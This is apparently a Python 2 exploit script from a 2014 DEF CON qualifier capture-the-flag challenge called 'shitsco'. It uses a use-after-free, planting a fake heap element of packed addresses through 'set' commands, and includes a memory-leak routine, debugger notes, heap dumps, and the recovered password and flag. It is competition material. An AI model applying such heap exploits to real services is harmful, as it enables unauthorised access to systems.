__author__ = 'HuyNA'
'''
Gynophage: 2 points

shitsco

http://services.2014.shallweplayaga.me/shitsco_c8b1aa31679e945ee64bde1bdb19d035 is running at:

nc shitsco_c8b1aa31679e945ee64bde1bdb19d035.2014.shallweplayaga.me 31337

Capture the flag.

==========Available Commands==========
|enable                               |
|ping                                 |
|tracert                              |
|?                                    |
|shell                                |
|set                                  |
|show                                 |
|credits                              |
|quit                                 |
======================================
Type ? followed by a command for more detailed information

pass: bruT3m3hard3rb4by
The flag is: Dinosaur vaginas
'''
import sys
import os
import socket
import time
import telnetlib
import struct


def recv_until(sock, delim):
    buf = ""
    while True:
        c = sock.recv(1)
        buf += c
        if delim in buf:
            break
    return buf

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#184.175.99.226 9090
host = "shitsco_c8b1aa31679e945ee64bde1bdb19d035.2014.shallweplayaga.me"
local_host="192.168.248.171"
port = 31337
s.connect((host, port))
#s.connect((local_host, 2323))

sys.stdin.read(1)

password_string = struct.pack('<I',0x0804C3A0)

flag_string = struct.pack('<I',0x80499DB)
a1 = struct.pack('<I',0x0804C34C)


fake_element = flag_string + password_string + a1 + a1

def set_command(a):
    global s
    print recv_until(s,'$ ')
    s.send('set '+a+' \n')
    time.sleep(0.001)

set_command('aaaaaaaaaaaa 111111111111')
set_command('bbbbbbbbbbbb 222222222222')
set_command('cccccccccccc 333333333333')
set_command('aaaaaaaaaaaa')
set_command('bbbbbbbbbbbb')
set_command(fake_element+' 6666')
# b *0x08048EB8
recv_until(s,'$ ')
s.send('show \n')
time.sleep(1)
print s.recv(2014)
print s.recv(2014)
print s.recv(2014)
print s.recv(2014)
print s.recv(2014)
print s.recv(2014)
print s.recv(2014)
print s.recv(2014)

t = telnetlib.Telnet()
t.sock = s
t.interact()

'''
set aaaaaaaa 11111111
set bbbbbbbb 22222222
set cccccccc 33333333
set aaaaaaaa
set bbbbbbbb
set 4444444455555555 ddddddddeeeeeeee

$ set aaaa 1111
$ set bbbb 2222
$ set cccc 3333
$ set aaaa
$ set bbbb
$ set 4444444455555555 ddddddddeeeeeeee

0000| 0x9a46058 --> 0x0
0004| 0x9a4605c ("444455555555")
0008| 0x9a46060 ("55555555")
0012| 0x9a46064 ("5555")
0016| 0x9a46068 --> 0x0
0020| 0x9a4606c --> 0x11
0024| 0x9a46070 --> 0x9a46078 --> 0x0
0028| 0x9a46074 --> 0x0
0032| 0x9a46078 --> 0x0
0036| 0x9a4607c --> 0x11


telescope 0x0804C36C 10
telescope 0x9a39048 20

b *0x08048E10
set aaaaaaaaaaaa 111111111111
set bbbbbbbbbbbb 222222222222
set cccccccccccc 333333333333
set aaaaaaaaaaaa
set bbbbbbbbbbbb
set 5555555555555555 6666
ping 5555555555555555

'''

def leak_mem():
    global s
    recv_until(s,'$ ')
    s.send('enable\n')
    time.sleep(0.001)
    print recv_until(s, ': ')
    s.send(5*'a'+'\n')
    time.sleep(0.001)
    data = recv_until(s, '$ ')
    s = 'Nope.  The password isn\'t '
    print data[len(s):]
    print data[len(s):].encode('hex')

'''
6161616161f077f7 20f477f7 e201a7ff 60c20408 48b264f7 60c20408
0a2420

6161616161c070f7 20c470f7 d20796ff 60c20408 48825df7 60c20408          0a2420
6161616161c079f7 20c479f7 9249c8ff 60c20408 488266f7 60c20408          0a2420
61616161616161616161616161616161616161616161616161616161616173f7010a2420
6161616161616161616161616161616161616161616161616161616161057cf7010a2420
6161616161616161616161616161616161616161616161616161616161e57cf7010a2420
'''